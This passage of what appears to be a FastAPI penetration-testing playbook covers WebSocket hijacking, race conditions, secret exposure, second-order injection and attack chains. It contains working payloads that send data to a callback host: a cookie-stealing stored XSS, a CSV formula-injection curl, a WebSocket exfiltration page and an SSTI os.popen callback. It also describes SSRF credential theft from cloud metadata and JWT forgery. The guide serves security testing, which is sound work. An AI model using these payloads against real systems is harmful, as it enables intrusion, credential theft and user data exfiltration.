# TrustedHostMiddleware bypass — test if missing
curl "$TARGET/api/v1/users" \
  -H "Host: attacker.com" \
  -H "Authorization: Bearer $TOKEN"

# Cache key confusion — missing Vary header
# Request 1: with auth
curl -v "$TARGET/api/v1/dashboard" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: session=<session_cookie>"
# Check: does response include Vary: Authorization, Cookie?
# If no Vary header, CDN may cache authenticated response and serve to unauthenticated users

# Request 2: without auth — do we get cached authenticated response?
sleep 1
curl -v "$TARGET/api/v1/dashboard"  # No auth headers
```

---

## Phase 6 — WebSocket Security Testing

### 6A — WebSocket Authentication & IDOR

```bash
# Install wscat for WebSocket testing
npm install -g wscat

# Test 1: No authentication on WebSocket
wscat -c "wss://target.com/ws/notifications"
# Send: {"action": "subscribe", "channel": "user_1_notifications"}
# If you receive notifications without auth → CRITICAL

# Test 2: Auth at handshake, not per-message
# Connect with valid auth
wscat -c "wss://target.com/ws/chat" \
  --header "Authorization: Bearer $TOKEN"
# Then try to access other users' channels after connection:
# {"action": "subscribe", "channel_id": "victim_user_id"}
# {"action": "get_messages", "user_id": 2}

# Test 3: Cross-origin WebSocket hijacking
cat > /tmp/cswh_test.html << 'EOF'
<script>
var ws = new WebSocket('wss://target.com/ws/notifications');
ws.onopen = function() {
    ws.send(JSON.stringify({"action": "subscribe", "channel": "admin"}));
};
ws.onmessage = function(e) {
    fetch('https://<oob_url>/ws_data?d=' + btoa(e.data));
};
</script>
EOF
# Serve this page and check if OOB receives WebSocket data
# Vulnerable if no Origin validation on WebSocket upgrade

# Python WebSocket testing script
python3 << 'EOF'
import asyncio, websockets, json

async def test_ws_idor():
    # Test without auth first
    try:
        async with websockets.connect("wss://target.com/ws/notifications") as ws:
            print("Connected WITHOUT auth - potential auth bypass!")
            await ws.send(json.dumps({"action": "get_user_data", "user_id": 1}))
            response = await ws.recv()
            print(f"Response: {response}")
    except Exception as e:
        print(f"No auth rejected: {e}")

    # Test with valid token but accessing other user's channel
    try:
        async with websockets.connect(
            "wss://target.com/ws/notifications",
            extra_headers={"Authorization": "Bearer <YOUR_TOKEN>"}
        ) as ws:
            # Try subscribing to admin channel
            await ws.send(json.dumps({"action": "subscribe", "channel_id": 1}))
            await ws.send(json.dumps({"action": "subscribe", "channel_id": "admin"}))
            response = await ws.recv()
            print(f"Admin channel response: {response}")
    except Exception as e:
        print(f"Error: {e}")

asyncio.run(test_ws_idor())
EOF

# Test 4: Message replay attack
# Capture a sensitive WS message, disconnect, reconnect, replay
# Does the server accept replayed action messages?

# Test 5: Per-message authorization after handshake auth
# Connect authenticated, then try admin-only actions in messages
# {"action": "admin_broadcast", "message": "test"}
# {"action": "delete_user", "user_id": 2}
# {"action": "update_role", "user_id": 2, "role": "admin"}
```

---

## Phase 7 — Race Conditions in FastAPI

### 7A — BackgroundTask Race Conditions

FastAPI's BackgroundTasks execute AFTER the HTTP response is returned, creating race windows:

```python
# VULNERABLE PATTERN (common in FastAPI):
@router.post("/redeem-coupon")
async def redeem_coupon(
    coupon_code: str,
    current_user = Depends(get_current_user),
    background_tasks: BackgroundTasks,
    db: Session = Depends(get_db)
):
    coupon = db.query(Coupon).filter_by(code=coupon_code).first()
    if coupon.is_used:
        raise HTTPException(400, "Coupon already used")
    # HTTP response returned here — race window begins
    background_tasks.add_task(mark_coupon_used, coupon.id, current_user.id)
    return {"message": "Coupon redeemed!"}

# Attack: fire 30 concurrent requests before background task runs
```

```python
import asyncio, aiohttp

async def race_fastapi_endpoint(url, headers, payload, n=30):
    """Race condition test for FastAPI endpoints."""
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(url, json=payload, headers=headers)
            for _ in range(n)
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        results = []
        for i, resp in enumerate(responses):
            if hasattr(resp, 'status'):
                body = await resp.text()
                results.append({
                    "request_num": i,
                    "status": resp.status,
                    "length": len(body),
                    "success": resp.status in [200, 201, 204]
                })
        successes = sum(1 for r in results if r.get('success'))
        print(f"Successes: {successes}/{n}")
        if successes > 1:
            print("RACE CONDITION DETECTED!")
        return results

# Test scenarios:
asyncio.run(race_fastapi_endpoint(
    "https://target.com/api/v1/redeem-coupon",
    {"Authorization": f"Bearer {TOKEN}"},
    {"coupon_code": "DISCOUNT50"},
    n=30
))

asyncio.run(race_fastapi_endpoint(
    "https://target.com/api/v1/transfer",
    {"Authorization": f"Bearer {TOKEN}"},
    {"amount": 100, "to_account": "attacker_account"},
    n=20
))
```

### 7B — Async/Await Race Windows

FastAPI's async handlers create race windows between `await` calls:

```python
# VULNERABLE PATTERN:
@router.post("/purchase")
async def purchase_item(item_id: int, current_user = Depends(get_current_user)):
    user_credits = await get_user_credits(current_user.id)  # READ
    item_price = await get_item_price(item_id)
    if user_credits < item_price:
        raise HTTPException(402, "Insufficient credits")
    await deduct_credits(current_user.id, item_price)   # WRITE
    await deliver_item(current_user.id, item_id)
    # Race window: between READ and WRITE — fire concurrent requests

# Attack with concurrent purchases:
asyncio.run(race_fastapi_endpoint(
    "https://target.com/api/v1/purchase",
    {"Authorization": f"Bearer {TOKEN}"},
    {"item_id": 1},
    n=20
))
```

---

## Phase 8 — Deployment & Infrastructure Testing

### 8A — Debug Mode & Documentation Exposure

```bash
# These should NEVER be accessible in production
curl -I https://target.com/docs          # Swagger UI
curl -I https://target.com/redoc         # ReDoc
curl -I https://target.com/openapi.json  # Raw OpenAPI schema

# FastAPI debug mode detection
curl https://target.com/stxnonexistentpath123
# Debug mode: returns full Python traceback with file paths and code
# Production mode: returns {"detail":"Not Found"}

# Settings/config exposure
curl https://target.com/api/settings
curl https://target.com/api/config
curl https://target.com/api/debug/config
curl https://target.com/api/env

# Health check over-disclosure
curl https://target.com/health
curl https://target.com/health/live
curl https://target.com/health/ready
curl https://target.com/api/health
# Should return only {status: "ok"} — not DB connection strings, version info, env vars
```

### 8B — Environment Variable & Secret Exposure

```bash
# Check if FastAPI settings/config endpoint exposes env vars
curl "$BASE_URL/debug/settings" -H "Authorization: $ADMIN_TOKEN"
curl "$BASE_URL/api/settings" -H "Authorization: $TOKEN"

# Check for secret_key exposure in error responses
curl "$BASE_URL/api/auth/verify" \
  -H "Content-Type: application/json" \
  -d '{"token": "malformed.token.value"}'
# Some FastAPI error handlers accidentally include configuration in error messages

# Check Prometheus metrics for information disclosure
curl https://target.com/metrics | grep -i "secret\|key\|password\|token\|db_url"

# Check for .env file exposure
curl https://target.com/.env
curl https://target.com/.env.local
curl https://target.com/.env.production
```

### 8C — Dependency Vulnerability Scanning

```bash
# If requirements.txt or pyproject.toml is accessible
curl https://target.com/requirements.txt
curl https://raw.githubusercontent.com/<org>/<repo>/main/requirements.txt

# Scan dependencies for known CVEs
pip install safety
safety check -r /workspace/requirements.txt --json > /workspace/dep_vulns.json

# Use trivy for container scanning if Dockerfile is accessible
trivy fs /workspace/repo/ --security-checks vuln,secret

# Key packages to check for outdated versions:
# fastapi < 0.95.0: multiple security fixes
# starlette < 0.27.0: path traversal in StaticFiles
# python-jose < 3.3.0: JWT algorithm confusion
# pydantic < 1.10.x/2.x.x: validation bypass issues
# uvicorn < 0.20.0: HTTP response splitting
```

---

## Phase 9 — Second-Order & Business Logic Testing

### 9A — Second-Order Vulnerabilities in FastAPI

```bash
OOB=$(cat /workspace/oob_endpoint.txt)
UNIQUE_ID="stx_$(openssl rand -hex 4)"

# Inject second-order payloads into stored fields
# Username with SSTI payload
curl -X POST "$BASE_URL/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"{{7*7}}_$UNIQUE_ID\", \"email\": \"$UNIQUE_ID@test.com\", \"password\": \"Pass123!\"}"

# Username with SSRF payload (triggers when admin views user list)
curl -X POST "$BASE_URL/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"stxSSRF\", \"avatar_url\": \"http://$OOB/second_order_ssrf_$UNIQUE_ID\"}"

# Username with stored XSS (triggers in admin dashboard)
curl -X POST "$BASE_URL/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"<script>fetch('https://$OOB/xss_$UNIQUE_ID?c='+document.cookie)</script>\"}"

# Bio/description with formula injection (triggers on CSV export)
curl -X PUT "$BASE_URL/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"bio\": \"=cmd|'/C curl $OOB/formula_inject_$UNIQUE_ID'!A0\"}"

# After injection, trigger downstream processing:
# 1. View admin user list (SSTI/XSS)
# 2. Export user report as CSV (formula injection)
# 3. Send email notification (header injection)
# 4. Generate PDF report (SSRF/SSTI via PDF generator)

# Monitor OOB callbacks
echo "Monitoring OOB for $UNIQUE_ID callbacks..."
sleep 60
grep "$UNIQUE_ID" /workspace/oob_callbacks.log
```

### 9B — Business Logic in FastAPI REST APIs

```bash
# Negative value injection
curl -X POST "$BASE_URL/orders" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id": 1, "quantity": -1, "discount": 150}'  # quantity=-1, discount>100%

# Integer overflow via Pydantic int field
curl -X POST "$BASE_URL/orders" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id": 1, "quantity": 9999999999999999}'

# Workflow step bypass — directly hit the completion endpoint
# If payment → process → deliver is a 3-step flow:
curl -X POST "$BASE_URL/orders/123/deliver" \
  -H "Authorization: Bearer $TOKEN"
# Without completing payment step

# Concurrent coupon redemption (race condition)
asyncio.run(race_fastapi_endpoint(
    "https://target.com/api/v1/coupons/redeem",
    {"Authorization": f"Bearer {TOKEN}"},
    {"coupon_code": "ONETIME"},
    n=20
))

# BackgroundTask ownership bypass
# Trigger a background export job targeting another user's data
curl -X POST "$BASE_URL/export/data" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_ids": [1, 2, 3, 99999], "format": "csv"}'
# Does the background task validate ownership of all user_ids?
```

---

## Validation Requirements

### Evidence Standards for FastAPI Findings

**Authentication/Authorization Bypass:**
- Side-by-side requests: unauthorized (no token / wrong token) → data returned
- Dependency map showing which dependency was missing or wrong
- Evidence of the exact code path: "Route GET /api/v1/admin uses `Depends` not `Security` — scopes not enforced"

**IDOR:**
- Account A token → Account B object → data returned
- Cross-tenant: Tenant A token → Tenant B data → data returned
- BackgroundTask IDOR: trigger job for victim IDs → download result → victim data present

**Mass Assignment:**
- Before: GET /users/me → role = "user"
- Attack: PUT /users/me with role = "admin"
- After: GET /users/me → role = "admin"

**CORS:**
- Request with attacker Origin + credentials → ACAO: attacker.com + ACAC: true
- Functional PoC HTML that reads authenticated endpoint data from attacker domain

**JWT Attacks:**
- Decoded token showing the manipulated claim
- Request with modified token → 200 response with elevated access
- If algorithm confusion: show original alg + public key used as HS256 secret

**SSTI:**
- `{{7*7}}` → 49 in response (safe detection)
- OOB callback via `os.popen('curl http://<oob_url>/ssti')` for blind confirmation
- RCE: `id` command output visible in response or OOB

**Race Condition:**
- Before state: balance / coupon / credit count screenshot
- 30 concurrent requests → multiple success responses (captured in asyncio output)
- After state: balance/credit/coupon used multiple times beyond allowed

### False Positive Elimination for FastAPI

Before reporting any FastAPI finding, confirm:

1. **DI Gap:** Actually request the endpoint without the auth header — not just with an invalid token. Test all HTTP methods — some may be protected while others aren't.
2. **IDOR:** Confirm with a SECOND test account you control, not by guessing. Verify the response actually contains the victim's data, not generic data.
3. **Mass Assignment:** Verify the new field value persists in subsequent GET requests. A 200 response that accepts the field but ignores it is not a vulnerability.
4. **JWT Attack:** Reproduce the token manipulation independently using a second generated token. Verify the modified token actually grants elevated access, not just a 200 with the same data.
5. **CORS:** Confirm `Access-Control-Allow-Credentials: true` IS present AND origin IS reflected. Both conditions must hold simultaneously. A CORS misconfiguration without credentials is lower severity.
6. **SSTI:** Confirm with the math probe `{{7*7}}` returns `49` BEFORE attempting RCE payloads. Never report SSTI from an OOB callback alone — the callback must be tied to template execution, not just reflection.

---

## FastAPI-Specific Attack Chains

### Chain 1: OpenAPI → Hidden Admin Route → Scope Bypass → Data Exfiltration
1. Mine `/openapi.json` → find routes with no security requirement
2. Fuzz for hidden routes not in schema → find `/api/v1/internal/users`
3. Access with regular user token → 200 (no auth check)
4. Enumerate all user data → mass PII exposure
EVS: 82

### Chain 2: Pydantic Extra Fields → Role Escalation → Privilege Escalation → Full Admin
1. PUT `/api/v1/users/me` with `{"role": "admin"}` → Pydantic `extra="allow"` accepts it
2. GET `/api/v1/users/me` → role is now "admin"
3. Access `/api/v1/admin/users` → 200 with all user data
4. POST `/api/v1/admin/users/1/delete` → delete any user
EVS: 88

### Chain 3: SSRF → Cloud Metadata → AWS Credentials → S3 Exfiltration
1. Find `image_url` parameter in profile endpoint
2. SSRF to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Retrieve IAM role credentials
4. Use credentials to list and download S3 buckets with customer data
EVS: 95

### Chain 4: JWT Algorithm Confusion → Admin Token → Full Platform Takeover
1. Retrieve RS256 public key from `/.well-known/jwks.json`
2. Sign new JWT with `alg: HS256` using public key as secret
3. Set `sub: admin@target.com`, `role: admin`, `is_superuser: true`
4. Access all admin endpoints with crafted token
EVS: 90

### Chain 5: Mounted Subapp Bypass → Admin UI → Create Admin User → Account Takeover
1. Discover Starlette Admin at `/admin/` — global auth middleware not applied
2. Access admin UI without authentication
3. Create new admin user via admin UI form
4. Login with new admin credentials → full platform access
EVS: 95

### Chain 6: BackgroundTask IDOR + Race Condition → Cross-User Data Exfiltration
1. POST `/api/v1/export` with `{"user_ids": [1,2,3,...,1000]}` → background export job
2. BackgroundTask runs without re-checking ownership
3. Simultaneously race the coupon endpoint for financial gain
4. Download export result → all users' PII
EVS: 80
